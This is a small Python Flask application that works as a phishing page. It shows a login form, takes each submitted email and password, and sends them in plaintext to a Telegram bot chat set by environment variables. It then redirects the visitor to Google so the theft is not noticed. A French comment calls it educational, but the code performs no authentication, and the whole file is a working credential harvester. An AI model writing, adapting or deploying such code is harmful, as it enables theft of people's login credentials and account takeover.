from dotenv import load_dotenv
load_dotenv()
from flask import Flask, request, redirect, render_template
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # Envoyer un message à Telegram (à but éducatif, remplace par une vraie authentification en production)
        message = f"Essai de connexion:\nEmail: {email}\nMot de passe: {password}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}
        requests.post(url, data=data)

        return redirect("https://www.google.com/")
    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)